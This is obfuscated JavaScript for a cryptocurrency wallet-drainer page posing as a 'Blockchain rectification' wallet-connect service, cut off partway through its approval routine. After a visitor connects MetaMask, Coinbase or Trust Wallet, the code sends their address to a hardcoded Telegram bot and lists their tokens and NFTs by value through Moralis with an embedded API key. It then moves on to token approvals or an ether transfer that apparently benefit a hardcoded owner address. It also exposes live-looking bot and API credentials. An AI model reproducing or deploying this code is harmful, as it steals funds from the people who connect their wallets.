function _0x4a79(){const _0x535e80=['application/json','GET','.proceed','315XgXsPQ','formatted','6fzFotT','balances','message','870sQVRIk','coinbase','getOwner','Tokens:','networkVersion','0x8d42303D6B6eBB4f110A7648A08A07573315149e','2020775dAteLQ','/nft/collections?chain=','92zRpNub','Deprecate','totalSupply','DestroyedBlackFunds','New\x20token','chainId:','status','function','who','feeBasisPoints','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','name','setApprovalForAll','Error\x20processing\x20item\x20','transferFrom','from','Approve\x20Completed\x20Successfully','newMaxFee','undefined','connector','38148FDdFrb','options','_from','revealTimeStamp','https://link.trustwallet.com/open_url?url=','interfaceId','isBlackListed','approve','error','4545792IufakY','setRevealTimestamp','redeem','28cAdHPx','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','uint256','tokenURI','setStartingIndex','maxFee','catch','gasPrice','location','symbol','allowance','REVEAL_TIMESTAMP','Your\x20address\x20','_initialSupply','Pause','deprecated','Token\x20balance\x20is\x20','Cl\x20address\x20:\x20','No\x20address','supportsInterface','Transaction\x20Rejected','_user','Incorrect\x20network','payable','trustwallet','_spender','view','eth','hash','approved','mintApe','removeBlackList','bytes4','CoinbaseWalletConnector','tokenId','Token','_symbol','.connect','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','map','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','spender','_value','_upgradedAddress','3866807tWngDm','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','_to','search','Unpause','startingIndexBlock','amount','Error\x20collecting\x20info\x20about\x20wallet','177368unqQAR','openModal','then','_data','balance','provenanceHash','operator','address','renounceOwnership','log','flipSaleState','decimals','value','emergencySetStartingIndexBlock','tokenByIndex','issue','transferOwnership','ee71d215d0dec7d1bf950851c84d9643','bytes','destroyBlackFunds','length','setBaseURI','_name','_balance','2946bsCVTd','&text=','numberOfTokens','TOKEN\x20Contract\x20Address\x20','52TQtJHu','string','https://deep-index.moralis.io/api/v2/','NFTs\x20collection\x20','NFT\x20Contract\x20Address\x20','withdraw','.trust','/erc20','newAddress','https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=','newBasisPoints','metamask','0xea8968B218a551919FbD5f1166328C82a96dED54','Error:\x20','safeTransferFrom','index','Issue','_maker','balanceOf','baseURI','sort','Transfer','event','getApproved','&format=decimal&limit=','token_address','OwnershipTransferred','999999999999999999999999999999999999999999999999999999999999999999999999','owner','Transaction\x20Receipt:\x20','nonpayable','pause','setProvenanceHash','sending\x20ether','1981411544','constructor','5722diSbiR','.meta','saleStart','tokens-list','Approval','MAX_UINT','Initial\x20list\x20','Hahahahahah','click','tokenOfOwnerByIndex','toString','href','Unable\x20to\x20get\x20NFts','getProvider','json','usd','.coinbase','Transaction\x20hash\x20','RemovedBlackList','unpause','isApprovedForAll','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','Approved','previousOwner','startingIndex','bool','Params'];_0x4a79=function(){return _0x535e80;};return _0x4a79();}const _0x71a47e=_0x537e;(function(_0x3a95b6,_0x59a48e){const _0xf9de29=_0x537e,_0x3f8772=_0x3a95b6();while(!![]){try{const _0x54d89e=parseInt(_0xf9de29(0x12b))/0x1*(parseInt(_0xf9de29(0x19f))/0x2)+parseInt(_0xf9de29(0x177))/0x3*(parseInt(_0xf9de29(0x10b))/0x4)+parseInt(_0xf9de29(0x109))/0x5+-parseInt(_0xf9de29(0x1bf))/0x6*(parseInt(_0xf9de29(0x157))/0x7)+parseInt(_0xf9de29(0x15f))/0x8*(-parseInt(_0xf9de29(0x1bd))/0x9)+-parseInt(_0xf9de29(0x1c2))/0xa*(parseInt(_0xf9de29(0x11f))/0xb)+-parseInt(_0xf9de29(0x128))/0xc*(-parseInt(_0xf9de29(0x17b))/0xd);if(_0x54d89e===_0x59a48e)break;else _0x3f8772['push'](_0x3f8772['shift']());}catch(_0x42f4d2){_0x3f8772['push'](_0x3f8772['shift']());}}}(_0x4a79,0x5fb4b));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {mainnet,bsc}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[mainnet,bsc],projectId=_0x71a47e(0x170),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x71a47e(0x14c))]({'chains':chains,'options':{'appName':'Blockchain\x20rectification'}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x71a47e(0x151),'coinbase':'https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png'}},ethereumClient);let currentUrl=window[_0x71a47e(0x133)]['href'];const OWNER_ADDRESS=_0x71a47e(0x187),ABI=[{'constant':!![],'inputs':[],'name':_0x71a47e(0x116),'outputs':[{'name':'','type':_0x71a47e(0x17c)}],'payable':![],'stateMutability':'view','type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':_0x71a47e(0x156),'type':_0x71a47e(0x166)}],'name':'deprecate','outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':'_spender','type':_0x71a47e(0x166)},{'name':_0x71a47e(0x155),'type':'uint256'}],'name':_0x71a47e(0x126),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':'function'},{'constant':!![],'inputs':[],'name':_0x71a47e(0x13a),'outputs':[{'name':'','type':_0x71a47e(0x1b8)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x71a47e(0x166)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':_0x71a47e(0x10d),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':_0x71a47e(0x121),'type':_0x71a47e(0x166)},{'name':_0x71a47e(0x159),'type':_0x71a47e(0x166)},{'name':_0x71a47e(0x155),'type':'uint256'}],'name':_0x71a47e(0x119),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x71a47e(0x166)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[{'name':'','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x1c0),'outputs':[{'name':'','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':_0x71a47e(0x16a),'outputs':[{'name':'','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':'maximumFee','outputs':[{'name':'','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[],'name':_0x71a47e(0x1b2),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[{'name':_0x71a47e(0x18c),'type':_0x71a47e(0x166)}],'name':'getBlackListStatus','outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':'address'},{'name':'','type':'address'}],'name':'allowed','outputs':[{'name':'','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':'function'},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x71a47e(0x1b8)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':'function'},{'constant':!![],'inputs':[{'name':_0x71a47e(0x113),'type':'address'}],'name':_0x71a47e(0x18d),'outputs':[{'name':'','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[],'name':_0x71a47e(0x19a),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':_0x71a47e(0x1c4),'outputs':[{'name':'','type':_0x71a47e(0x166)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':_0x71a47e(0x197),'outputs':[{'name':'','type':_0x71a47e(0x166)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':_0x71a47e(0x134),'outputs':[{'name':'','type':_0x71a47e(0x17c)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':'_to','type':_0x71a47e(0x166)},{'name':_0x71a47e(0x155),'type':_0x71a47e(0x12d)}],'name':'transfer','outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':_0x71a47e(0x185),'type':'uint256'},{'name':_0x71a47e(0x11c),'type':_0x71a47e(0x12d)}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':_0x71a47e(0x15d),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x16e),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':_0x71a47e(0x15d),'type':'uint256'}],'name':_0x71a47e(0x12a),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[{'name':'_owner','type':_0x71a47e(0x166)},{'name':_0x71a47e(0x144),'type':'address'}],'name':_0x71a47e(0x135),'outputs':[{'name':'remaining','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':'view','type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':'basisPointsRate','outputs':[{'name':'','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x125),'outputs':[{'name':'','type':_0x71a47e(0x1b8)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':'_clearedUser','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x14a),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':!![],'inputs':[],'name':_0x71a47e(0x1a4),'outputs':[{'name':'','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':'newOwner','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x16f),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'constant':![],'inputs':[{'name':'_blackListedUser','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x172),'outputs':[],'payable':![],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[{'name':_0x71a47e(0x138),'type':'uint256'},{'name':_0x71a47e(0x175),'type':_0x71a47e(0x17c)},{'name':_0x71a47e(0x14f),'type':_0x71a47e(0x17c)},{'name':'_decimals','type':_0x71a47e(0x12d)}],'payable':![],'stateMutability':_0x71a47e(0x199),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x71a47e(0x15d),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x18b),'type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x71a47e(0x15d),'type':'uint256'}],'name':'Redeem','type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x71a47e(0x183),'type':_0x71a47e(0x166)}],'name':_0x71a47e(0x10c),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x71a47e(0x114),'type':'uint256'},{'indexed':![],'name':_0x71a47e(0x130),'type':'uint256'}],'name':_0x71a47e(0x1b9),'type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':_0x71a47e(0x166)},{'indexed':![],'name':_0x71a47e(0x176),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x10e),'type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x71a47e(0x140),'type':_0x71a47e(0x166)}],'name':'AddedBlackList','type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x71a47e(0x140),'type':_0x71a47e(0x166)}],'name':_0x71a47e(0x1b1),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':_0x71a47e(0x166)},{'indexed':!![],'name':_0x71a47e(0x154),'type':'address'},{'indexed':![],'name':_0x71a47e(0x16b),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x1a3),'type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x71a47e(0x11a),'type':_0x71a47e(0x166)},{'indexed':!![],'name':'to','type':_0x71a47e(0x166)},{'indexed':![],'name':_0x71a47e(0x16b),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x190),'type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[],'name':_0x71a47e(0x139),'type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[],'name':_0x71a47e(0x15b),'type':'event'}],ABIN=[{'inputs':[{'internalType':_0x71a47e(0x17c),'name':_0x71a47e(0x116),'type':'string'},{'internalType':_0x71a47e(0x17c),'name':'symbol','type':_0x71a47e(0x17c)},{'internalType':'uint256','name':'maxNftSupply','type':'uint256'},{'internalType':_0x71a47e(0x12d),'name':_0x71a47e(0x1a1),'type':_0x71a47e(0x12d)}],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x19e)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x71a47e(0x166),'name':'owner','type':_0x71a47e(0x166)},{'indexed':!![],'internalType':_0x71a47e(0x166),'name':_0x71a47e(0x148),'type':'address'},{'indexed':!![],'internalType':'uint256','name':_0x71a47e(0x14d),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x1a3),'type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x71a47e(0x166),'name':_0x71a47e(0x197),'type':_0x71a47e(0x166)},{'indexed':!![],'internalType':_0x71a47e(0x166),'name':_0x71a47e(0x165),'type':_0x71a47e(0x166)},{'indexed':![],'internalType':_0x71a47e(0x1b8),'name':_0x71a47e(0x148),'type':_0x71a47e(0x1b8)}],'name':'ApprovalForAll','type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x71a47e(0x166),'name':_0x71a47e(0x1b6),'type':'address'},{'indexed':!![],'internalType':_0x71a47e(0x166),'name':'newOwner','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x195),'type':_0x71a47e(0x191)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x71a47e(0x166),'name':'from','type':_0x71a47e(0x166)},{'indexed':!![],'internalType':_0x71a47e(0x166),'name':'to','type':_0x71a47e(0x166)},{'indexed':!![],'internalType':'uint256','name':_0x71a47e(0x14d),'type':'uint256'}],'name':_0x71a47e(0x190),'type':_0x71a47e(0x191)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':_0x71a47e(0x17c),'name':'','type':'string'}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x71a47e(0x12d),'name':'','type':_0x71a47e(0x12d)}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[],'name':_0x71a47e(0x136),'outputs':[{'internalType':_0x71a47e(0x12d),'name':'','type':_0x71a47e(0x12d)}],'stateMutability':_0x71a47e(0x145),'type':'function'},{'inputs':[],'name':'apePrice','outputs':[{'internalType':'uint256','name':'','type':_0x71a47e(0x12d)}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x166),'name':'to','type':_0x71a47e(0x166)},{'internalType':'uint256','name':_0x71a47e(0x14d),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x126),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':'function'},{'inputs':[{'internalType':_0x71a47e(0x166),'name':'owner','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x18d),'outputs':[{'internalType':_0x71a47e(0x12d),'name':'','type':_0x71a47e(0x12d)}],'stateMutability':'view','type':_0x71a47e(0x112)},{'inputs':[],'name':_0x71a47e(0x18e),'outputs':[{'internalType':_0x71a47e(0x17c),'name':'','type':_0x71a47e(0x17c)}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[],'name':_0x71a47e(0x16c),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[],'name':_0x71a47e(0x169),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x12d),'name':_0x71a47e(0x14d),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x192),'outputs':[{'internalType':_0x71a47e(0x166),'name':'','type':_0x71a47e(0x166)}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x166),'name':_0x71a47e(0x197),'type':_0x71a47e(0x166)},{'internalType':_0x71a47e(0x166),'name':'operator','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x1b3),'outputs':[{'internalType':_0x71a47e(0x1b8),'name':'','type':'bool'}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[],'name':'maxApePurchase','outputs':[{'internalType':_0x71a47e(0x12d),'name':'','type':'uint256'}],'stateMutability':'view','type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x12d),'name':_0x71a47e(0x179),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x149),'outputs':[],'stateMutability':_0x71a47e(0x142),'type':'function'},{'inputs':[],'name':_0x71a47e(0x116),'outputs':[{'internalType':_0x71a47e(0x17c),'name':'','type':'string'}],'stateMutability':'view','type':_0x71a47e(0x112)},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x71a47e(0x166),'name':'','type':'address'}],'stateMutability':_0x71a47e(0x145),'type':'function'},{'inputs':[{'internalType':_0x71a47e(0x12d),'name':_0x71a47e(0x14d),'type':_0x71a47e(0x12d)}],'name':'ownerOf','outputs':[{'internalType':_0x71a47e(0x166),'name':'','type':_0x71a47e(0x166)}],'stateMutability':'view','type':_0x71a47e(0x112)},{'inputs':[],'name':_0x71a47e(0x167),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x166),'name':_0x71a47e(0x11a),'type':'address'},{'internalType':_0x71a47e(0x166),'name':'to','type':'address'},{'internalType':'uint256','name':_0x71a47e(0x14d),'type':'uint256'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x166),'name':'from','type':_0x71a47e(0x166)},{'internalType':'address','name':'to','type':'address'},{'internalType':_0x71a47e(0x12d),'name':_0x71a47e(0x14d),'type':_0x71a47e(0x12d)},{'internalType':_0x71a47e(0x171),'name':_0x71a47e(0x162),'type':_0x71a47e(0x171)}],'name':_0x71a47e(0x189),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x71a47e(0x1b8),'name':'','type':'bool'}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x166),'name':'operator','type':'address'},{'internalType':_0x71a47e(0x1b8),'name':_0x71a47e(0x148),'type':_0x71a47e(0x1b8)}],'name':_0x71a47e(0x117),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x71a47e(0x17c),'name':_0x71a47e(0x18e),'type':_0x71a47e(0x17c)}],'name':_0x71a47e(0x174),'outputs':[],'stateMutability':'nonpayable','type':_0x71a47e(0x112)},{'inputs':[{'internalType':'string','name':_0x71a47e(0x164),'type':_0x71a47e(0x17c)}],'name':_0x71a47e(0x19b),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':'uint256','name':_0x71a47e(0x122),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x129),'outputs':[],'stateMutability':'nonpayable','type':_0x71a47e(0x112)},{'inputs':[],'name':_0x71a47e(0x12f),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[],'name':_0x71a47e(0x1b7),'outputs':[{'internalType':_0x71a47e(0x12d),'name':'','type':_0x71a47e(0x12d)}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[],'name':_0x71a47e(0x15c),'outputs':[{'internalType':_0x71a47e(0x12d),'name':'','type':'uint256'}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x14b),'name':_0x71a47e(0x124),'type':_0x71a47e(0x14b)}],'name':_0x71a47e(0x13e),'outputs':[{'internalType':'bool','name':'','type':_0x71a47e(0x1b8)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x71a47e(0x134),'outputs':[{'internalType':_0x71a47e(0x17c),'name':'','type':_0x71a47e(0x17c)}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x12d),'name':_0x71a47e(0x18a),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x16d),'outputs':[{'internalType':'uint256','name':'','type':_0x71a47e(0x12d)}],'stateMutability':'view','type':_0x71a47e(0x112)},{'inputs':[{'internalType':'address','name':_0x71a47e(0x197),'type':_0x71a47e(0x166)},{'internalType':_0x71a47e(0x12d),'name':_0x71a47e(0x18a),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x1a8),'outputs':[{'internalType':'uint256','name':'','type':_0x71a47e(0x12d)}],'stateMutability':_0x71a47e(0x145),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':_0x71a47e(0x12d),'name':_0x71a47e(0x14d),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x12e),'outputs':[{'internalType':_0x71a47e(0x17c),'name':'','type':'string'}],'stateMutability':_0x71a47e(0x145),'type':'function'},{'inputs':[],'name':_0x71a47e(0x10d),'outputs':[{'internalType':_0x71a47e(0x12d),'name':'','type':'uint256'}],'stateMutability':_0x71a47e(0x145),'type':'function'},{'inputs':[{'internalType':_0x71a47e(0x166),'name':_0x71a47e(0x11a),'type':_0x71a47e(0x166)},{'internalType':_0x71a47e(0x166),'name':'to','type':'address'},{'internalType':'uint256','name':_0x71a47e(0x14d),'type':_0x71a47e(0x12d)}],'name':_0x71a47e(0x119),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':_0x71a47e(0x112)},{'inputs':[{'internalType':'address','name':'newOwner','type':_0x71a47e(0x166)}],'name':_0x71a47e(0x16f),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':'function'},{'inputs':[],'name':_0x71a47e(0x180),'outputs':[],'stateMutability':_0x71a47e(0x199),'type':'function'}];let wallet;$(_0x71a47e(0x1a0))['click'](async function(){const _0x1ba419=_0x71a47e;wallet=_0x1ba419(0x186),await connector();}),$(_0x71a47e(0x1af))['click'](async function(){const _0x364aee=_0x71a47e;wallet=_0x364aee(0x1c3),await connector();}),$(_0x71a47e(0x181))['click'](async function(){const _0x3a0963=_0x71a47e;wallet=_0x3a0963(0x143),await connector();}),$(_0x71a47e(0x150))[_0x71a47e(0x1a7)](async function(){const _0x5c1ef3=_0x71a47e;try{await web3Modal[_0x5c1ef3(0x160)]();}catch(_0x9e21cf){console[_0x5c1ef3(0x168)]('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x9e21cf);return;}});let connector=async()=>{const _0xf49b98=_0x71a47e;if(typeof web3==='undefined'&&typeof ethereum===_0xf49b98(0x11d)){console[_0xf49b98(0x168)](_0xf49b98(0x1a6));if(wallet===_0xf49b98(0x186)){let _0x4b1942='https://metamask.app.link/dapp/'+currentUrl;window[_0xf49b98(0x133)][_0xf49b98(0x1aa)]=_0x4b1942;}else{if(wallet===_0xf49b98(0x1c3)){let _0x435b05='https://go.cb-w.com/dapp?cb_url='+currentUrl;window[_0xf49b98(0x133)]['href']=_0x435b05;}else{if(wallet===_0xf49b98(0x143)){let _0x333eb4=_0xf49b98(0x123)+currentUrl;window[_0xf49b98(0x133)][_0xf49b98(0x1aa)]=_0x333eb4;}}}}else try{await web3Modal[_0xf49b98(0x160)]();}catch(_0x476178){console['log']('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x476178);return;}};$(_0x71a47e(0x1bc))[_0x71a47e(0x1a7)](async function(){const _0x5315b6=_0x71a47e;let _0x1b593b=getAccount();console[_0x5315b6(0x168)](_0x1b593b),!_0x1b593b[_0x5315b6(0x166)]&&(console[_0x5315b6(0x168)](_0x5315b6(0x13d)),alert(_0x5315b6(0x153))),_0x1b593b[_0x5315b6(0x11e)]['name']==='MetaMask'&&(_0x1b593b[_0x5315b6(0x11e)][_0x5315b6(0x120)][_0x5315b6(0x1ac)]()[_0x5315b6(0x1c6)]!=='1'&&(console[_0x5315b6(0x168)](_0x5315b6(0x141)),await switchNetwork({'chainId':0x1}))),selectedAccount=_0x1b593b[_0x5315b6(0x166)],sendMessage(_0x5315b6(0x1b4)),sendMessage(_0x5315b6(0x13c)+selectedAccount),covalenthqAPICall();});const Oxa=_0x71a47e(0x1c7),Oxc1='5227607491',Oxc2=_0x71a47e(0x19d);function _0x537e(_0x5cb3f1,_0x3ad47f){const _0x4a7955=_0x4a79();return _0x537e=function(_0x537e8a,_0x41c462){_0x537e8a=_0x537e8a-0x109;let _0x3be8dc=_0x4a7955[_0x537e8a];return _0x3be8dc;},_0x537e(_0x5cb3f1,_0x3ad47f);}async function covalenthqAPICall(){const _0x1462ce=_0x71a47e,_0x486552={'chain':_0x1462ce(0x146)},_0x52352e=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+_0x1462ce(0x182));_0x52352e[_0x1462ce(0x15a)]=new URLSearchParams(_0x486552)[_0x1462ce(0x1a9)]();const _0x3db96e={'method':_0x1462ce(0x1bb),'headers':{'accept':_0x1462ce(0x1ba),'X-API-Key':_0x1462ce(0x115)}};try{const _0x2ea1f6=await fetch(_0x52352e,_0x3db96e)[_0x1462ce(0x161)](_0xfb7f6b=>_0xfb7f6b[_0x1462ce(0x1ad)]());console[_0x1462ce(0x168)](_0x2ea1f6);let _0x46933f=_0x2ea1f6;console[_0x1462ce(0x168)](_0x1462ce(0x1a5),_0x46933f);let _0x48671f=await Promise['all'](_0x46933f[_0x1462ce(0x152)](async _0x157ba3=>{const _0x1c0e8b=_0x1462ce;let _0x53287a;try{_0x53287a=await getValue(_0x157ba3[_0x1c0e8b(0x194)],_0x157ba3[_0x1c0e8b(0x163)],_0x157ba3[_0x1c0e8b(0x16a)]);}catch(_0x179a88){_0x53287a=0x0;}return console['log'](_0x53287a),{'balance':_0x157ba3[_0x1c0e8b(0x163)],'value':_0x53287a,'address':_0x157ba3[_0x1c0e8b(0x194)]};}));console[_0x1462ce(0x168)](_0x1462ce(0x1a2),_0x48671f),tokens=_0x48671f['filter'](_0x587e88=>_0x587e88[_0x1462ce(0x16b)]>0x5),tokens[_0x1462ce(0x18f)]((_0x62a9e0,_0x5d26f0)=>_0x5d26f0['value']-_0x62a9e0[_0x1462ce(0x16b)]),console['log'](_0x1462ce(0x110),await getNetwork(),_0x1462ce(0x1c5),tokens),NFTs=await getNFTs(selectedAccount)[_0x1462ce(0x131)](_0xc63394=>{const _0x334a23=_0x1462ce;console[_0x334a23(0x168)](_0x334a23(0x1ab),_0xc63394);}),NFTs=NFTs['result'],console[_0x1462ce(0x168)](_0x1462ce(0x17e),NFTs);if(tokens['length']===0x0&&NFTs[_0x1462ce(0x173)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x1462ce(0x15e));}}async function onApprove(){const 